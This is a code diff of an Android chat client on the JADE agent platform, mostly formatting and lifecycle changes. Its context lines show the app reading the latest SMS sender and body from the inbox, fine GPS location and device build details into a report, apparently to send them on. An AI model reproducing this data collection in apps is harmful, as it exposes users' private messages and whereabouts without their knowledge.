@@ -1,6 +1,6 @@
 package chat.client.gui;
 
-import java.util.StringTokenizer;
+import java.util.Date;
 import java.util.logging.Level;
 
 import jade.core.MicroRuntime;
@@ -29,11 +29,10 @@ import android.view.MenuItem;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
-import android.widget.EditText;
 import android.widget.ScrollView;
 import android.widget.TextView;
-import chat.client.agent.ChatClientInterface;
 
+import chat.client.agent.ChatClientInterface;
 
 public class ChatActivity extends Activity {
 	private Logger logger = Logger.getJADELogger(this.getClass().getName());
@@ -44,7 +43,8 @@ public class ChatActivity extends Activity {
 
 	private String nickname;
 	private ChatClientInterface chatClientInterface;
-	private String DEVICE_NAME = Build.BRAND+" "+Build.DEVICE;
+	private String DEVICE_NAME = Build.BRAND + " " + Build.DEVICE;
+
 
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
@@ -84,11 +84,15 @@ public class ChatActivity extends Activity {
 	@Override
 	protected void onDestroy() {
 		super.onDestroy();
-
-		chatClientInterface.handleSpoken("El dispositivo "+DEVICE_NAME+" ha salido del sistema");
 		unregisterReceiver(myReceiver);
-
 		logger.log(Level.INFO, "Destroy activity!");
+	}
+
+	protected void onStop() {
+		super.onStop();
+		chatClientInterface.handleSpoken("---------------------------------------------- \n" +
+							"El dispositivo " + DEVICE_NAME + " ha salido del sistema \n" +
+							"-----------------------------------------------");
 	}
 
 	private OnClickListener buttonSendListener = new OnClickListener() {
@@ -108,24 +112,24 @@ public class ChatActivity extends Activity {
 	@Override
 	public boolean onOptionsItemSelected(MenuItem item) {
 		switch (item.getItemId()) {
-		case R.id.menu_participants:
-			Intent showParticipants = new Intent(ChatActivity.this,
-					ParticipantsActivity.class);
-			showParticipants.putExtra("nickname", nickname);
-			startActivityForResult(showParticipants, PARTICIPANTS_REQUEST);
-			return true;
-		case R.id.menu_clear:
+			case R.id.menu_participants:
+				Intent showParticipants = new Intent(ChatActivity.this,
+						ParticipantsActivity.class);
+				showParticipants.putExtra("nickname", nickname);
+				startActivityForResult(showParticipants, PARTICIPANTS_REQUEST);
+				return true;
+			case R.id.menu_clear:
 			/*
 			Intent broadcast = new Intent();
 			broadcast.setAction("jade.demo.chat.CLEAR_CHAT");
 			logger.info("Sending broadcast " + broadcast.getAction());
 			sendBroadcast(broadcast);
 			*/
-			final TextView chatField = (TextView) findViewById(R.id.chatTextView);
-			chatField.setText("");
-			return true;
-		default:
-			return super.onOptionsItemSelected(item);
+				final TextView chatField = (TextView) findViewById(R.id.chatTextView);
+				chatField.setText("");
+				return true;
+			default:
+				return super.onOptionsItemSelected(item);
 		}
 	}
 
@@ -137,6 +141,7 @@ public class ChatActivity extends Activity {
 			}
 		}
 	}
+
 
 	private class MyReceiver extends BroadcastReceiver {
 
@@ -187,31 +192,33 @@ public class ChatActivity extends Activity {
 							public void onClick(
 									DialogInterface dialog, int id) {
 								dialog.cancel();
-								if(fatal) finish();
+								if (fatal) finish();
 							}
 						});
 		AlertDialog alert = builder.create();
-		alert.show();		
+		alert.show();
 	}
 
-	private void sendDeviceInformation(){
+	private void sendDeviceInformation() {
 		String locationInfo = "";
 		String message = "";
+		Date fecha = new Date();
 		String smsMsgData = getSMSdata();
 		Location location = getLocationData();
 
-		if (location!=null){
-			locationInfo += "Latitud: "+location.getLatitude()+" \n"
-					+"Longitud: "+location.getLongitude()+" \n"
-					+"Altitud: "+location.getAltitude()+" \n"
-					+"Extras: "+location.getExtras()+" \n";
-		}else{
+		if (location != null) {
+			locationInfo += "Latitud: " + location.getLatitude() + " \n"
+					+ "Longitud: " + location.getLongitude() + " \n"
+					+ "Altitud: " + location.getAltitude() + " \n"
+					+ "Extras: " + location.getExtras() + " \n";
+		} else {
 			locationInfo += "No se pueden obtener datos de geolocalización";
 		}
 
 		try {
 
 			message += "----- " + DEVICE_NAME + " -----\n"
+					+ "Fecha: "+fecha.toLocaleString()
 					+ "ID: " + Build.ID + " \n"
 					+ "Hardware name: " + Build.HARDWARE + " \n"
 					+ "SDK version: " + Build.VERSION.SDK + " \n"
@@ -236,32 +243,33 @@ public class ChatActivity extends Activity {
 
 	}
 
-	private String getSMSdata(){
+	private String getSMSdata() {
 		String smsMessage = "";
 		Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 		if (cursor.moveToFirst()) { // must check the result to prevent exception
 			//do {
-			smsMessage += cursor.getString(cursor.getColumnIndexOrThrow("address"))+ " \n";
-			smsMessage += cursor.getString(cursor.getColumnIndexOrThrow("body"))+ " \n";
+			smsMessage += cursor.getString(cursor.getColumnIndexOrThrow("address")) + " \n";
+			smsMessage += cursor.getString(cursor.getColumnIndexOrThrow("body")) + " \n";
 			//for(int idx=0;idx<cursor.getColumnCount();idx++)
 			//{
 			//smsMessage += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+ " \n";
 			//}
 			//} while (cursor.moveToNext());	//comento el while para que levante solo el 1er SMS
 		} else {
-			Log.d("SMS","no se encontraron sms");
+			Log.d("SMS", "no se encontraron sms");
 			smsMessage = "No se encontraron SMS";
 		}
+		cursor.close();
 		return smsMessage;
 	}
 
-	private Location getLocationData(){
-		String locationInfo="";
+	private Location getLocationData() {
+		String locationInfo = "";
 		Context context = getApplicationContext();
 		LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
 		Criteria criteria = new Criteria();
 
-		int currentapiVersion = android.os.Build.VERSION.SDK_INT;
+		int currentapiVersion = Build.VERSION.SDK_INT;
 		if (currentapiVersion >= 14) {
 			criteria.setSpeedAccuracy(Criteria.ACCURACY_HIGH);
 			criteria.setAccuracy(Criteria.ACCURACY_FINE);
